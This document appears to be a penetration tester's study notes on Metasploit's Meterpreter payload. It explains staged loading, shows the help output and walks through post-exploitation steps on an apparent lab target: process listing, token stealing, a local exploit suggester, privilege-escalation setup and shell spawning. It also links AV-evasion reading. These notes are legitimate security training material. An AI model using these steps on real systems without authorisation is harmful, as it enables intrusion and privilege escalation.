---
id: Meterpreter
aliases: []
tags:
  - Pentest/Tools/Metasploit/Sessions/Meterpreter
---

# Meterpreter

[Meterpreter](https://www.offsec.com/metasploit-unleashed/about-meterpreter/)
is an advanced, dynamically extensible [[Metasploit#Payloads|payload]]
that uses in-memory DLL injection stagers
and is extended over the network at runtime

<!-- Resources {{{-->
> [!info]- Resources
>
> - [Stageless Meterpreter Payloads](https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/)
>
> - [Modifying Metasploit x64 template for AV evasion](https://www.blackhillsinfosec.com/modifying-metasploit-x64-template-for-av-evasion/)
<!-- }}} -->

___

<!-- General {{{-->
## General

[How Meterpreter Works](https://www.offsec.com/metasploit-unleashed/about-meterpreter/#how-meterpreter-works)

1. **The target executes the initial stager**:
   This is usually one of bind, reverse, findtag, passivex, etc.
2. **The stager loads the DLL prefixed with Reflective**:
   The Reflective stub handles the loading/injection of the DLL.
3. **The Metepreter core initializes**:
   establishes a TLS/1.0 link over the socket and sends a `GET`.
   Metasploit receives this `GET` and configures the client.
4. **Meterpreter loads extensions**:
   It will always load stdapi and will load priv
   if the module gives administrative rights.
   All of these extensions are loaded over TLS/1.0 using a TLV protocol.

___
<!-- }}} -->

<!-- Usage {{{-->
## Usage

[Meterpreter Usage](https://www.offsec.com/metasploit-unleashed/meterpreter-basics/)

Synopsis

```sh
meterpreter > <command>
```

Meterpreter Help

```sh
help
```

<!-- Example {{{-->
> [!example]-
> ```sh
> meterpreter > help
> ```
> ```sh
> Core Commands
> =============
>
>     Command       Description
>     -------       -----------
>     ?             Help menu
>     background                Backgrounds the current session
>     bg                        Alias for background
>     bgkill                    Kills a background meterpreter script
>     bglist                    Lists running background scripts
>     bgrun                     Executes a meterpreter script as a background thread
>     channel                   Displays information or control active channels
>     close                     Closes a channel
>     disable_unicode_encoding  Disables encoding of unicode strings
>     enable_unicode_encoding   Enables encoding of unicode strings
>     exit                      Terminate the meterpreter session
>     get_timeouts              Get the current session timeout values
>     guid                      Get the session GUID
>     help                      Help menu
>     info                      Displays information about a Post module
>     irb                       Open an interactive Ruby shell on the current session
>     load                      Load one or more meterpreter extensions
>     machine_id                Get the MSF ID of the machine attached to the session
>     migrate                   Migrate the server to another process
>     pivot                     Manage pivot listeners
>     pry                       Open the Pry debugger on the current session
>     quit                      Terminate the meterpreter session
>     read                      Reads data from a channel
>     resource                  Run the commands stored in a file
>     run                       Executes a meterpreter script or Post module
>     secure                    (Re)Negotiate TLV packet encryption on the session
>     sessions                  Quickly switch to another session
>     set_timeouts              Set the current session timeout values
>     sleep                     Force Meterpreter to go quiet, then re-establish session.
>     transport                 Change the current transport mechanism
>     use                       Deprecated alias for "load"
>     uuid                      Get the UUID for the current session
>     write                     Writes data to a channel
> ...snip...
> ```
<!-- }}} -->

<!-- Migrate Process {{{-->
### Migrate Process

Migrate process to a user with more privilege

1. List processes

```sh
ps
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> meterpreter > ps
> ```
>
> ```
> Process List
> ============
>
>  PID   PPID  Name               Arch  Session  User                          Path
>  ---   ----  ----               ----  -------  ----                          ----
>  0     0     [System Process]                                                
>  4     0     System                                                          
>  216   1080  cidaemon.exe                                                    
>  272   4     smss.exe                                                        
>  292   1080  cidaemon.exe                                                    
> <...SNIP...>
>
>  1712  396   alg.exe                                                         
>  1836  592   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
>  1920  396   dllhost.exe                                                     
>  2232  3552  svchost.exe        x86   0                                      C:\WINDOWS\Temp\rad9E519.tmp\svchost.exe
>  2312  592   wmiprvse.exe                                                    
>  3552  1460  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
>  3624  592   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
>  4076  1080  cidaemon.exe                                                     ```sh
> ```
<!-- }}} -->

2. Steal process token

```sh
steal_token 1836
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> meterpreter > steal_token 1836
> ```
>
> ```sh
> Stolen token with username: NT AUTHORITY\NETWORK SERVICE
> ```
<!-- }}} -->

3. Background Meterpreter Session

```sh
background
```

4. [[Sessions#Run Additional Module|Run Additional Module]]

<!-- Tip {{{-->
> [!tip]-
>
> Run [local_exploit_suggester](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/multi/recon/local_exploit_suggester.md)
>
> ```sh
> search local_exploit_suggester
> ```
> ```sh
> run
> ```
>
> > [!example]-
> >
> > ```sh
> > msf6 post(multi/recon/local_exploit_suggester) > run
> > ```
> > ```sh
> > [*] 10.10.10.15 - Collecting local exploits for x86/windows...
> > [*] 10.10.10.15 - 34 exploit checks are being tried...
> > nil versions are discouraged and will be deprecated in Rubygems 4
> > [+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
> > [+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
> > [+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
> > [+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
> > [+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
> > [+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
> > [*] Post module execution completed
> > msf6 post(multi/recon/local_exploit_suggester) > 
> > ```
<!-- }}} -->

5. Select the session to tie the exploit to

```sh
set SESSION <id>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> msf exploit(linux/local/sudo_baron_samedit) > set SESSION 1
> ```
>
> ```sh
> SESSION => 1
> ```
<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->

<!-- Options {{{-->
## Options

- cd
- ls
- pwd
- download <file>

<!-- Info {{{ -->
> [!info]-
>
>
<!-- }}} -->

___
<!-- }}} -->

<!-- Session {{{-->
## Session

Process list

```sh
ps
```

Spawn a standard shell on the target

```sh
shell
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> meterpreter > shell
> ```
> ```sh
> Process 39640 created.
> Channel 2 created.
> Microsoft Windows XP [Version 5.1.2600]
> (C) Copyright 1985-2001 Microsoft Corp.
> ```
> ```cmd
> C:\WINDOWS\system32>
> ```
<!-- }}} -->

User ID

```sh
getuid
```

___
<!-- }}} -->
